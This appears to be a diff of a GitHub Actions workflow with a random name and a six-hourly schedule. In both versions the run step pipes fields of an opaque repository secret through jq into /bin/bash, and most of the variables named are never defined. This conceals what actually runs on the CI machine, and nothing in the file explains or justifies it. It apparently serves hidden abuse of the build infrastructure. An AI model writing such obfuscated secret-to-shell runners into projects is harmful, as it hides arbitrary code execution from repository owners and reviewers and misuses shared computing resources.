@@ -1,22 +1,26 @@
 name: tulinglong4318
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 0/6 * * *'
-
-jobs:  # 16848
+    - cron: '54 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: tulinglong4318
         env:
-          zfrt6: ${{ secrets.zfrt6 }}
+          lvky20: ${{ secrets.lvky20 }}
         run: |
-          echo $zfrt6 | jq -r .bzwa87 | /bin/bash
-          echo $mt5 | jq -r .hmvrm3434 | /bin/bash
-          echo $imexr4359 | jq -r .imutn1 | /bin/bash
-          echo $tx6 | jq -r .a7 | /bin/bash
-          echo $jki4389 | jq -r .e73248 | /bin/bash
-          echo $hyo83 | jq -r .fwvdj68750 | /bin/bash
+          echo $lvky20 | jq -r .vs3 | /bin/bash
+          echo $qj27 | jq -r .p73830 | /bin/bash
+          echo $r84 | jq -r .fr7281 | /bin/bash
+          echo $u0982 | jq -r .vd5056 | /bin/bash
+          echo $so882 | jq -r .bb3199 | /bin/bash
+          echo $ccm890 | jq -r .eqnul8 | /bin/bash
+          echo $ym58 | jq -r .vo9198 | /bin/bash
+          echo $wqld9 | jq -r .ot96554 | /bin/bash
+          echo $tvsd5025 | jq -r .fepsj7014 | /bin/bash
+          echo $hju23 | jq -r .binq38381 | /bin/bash
 
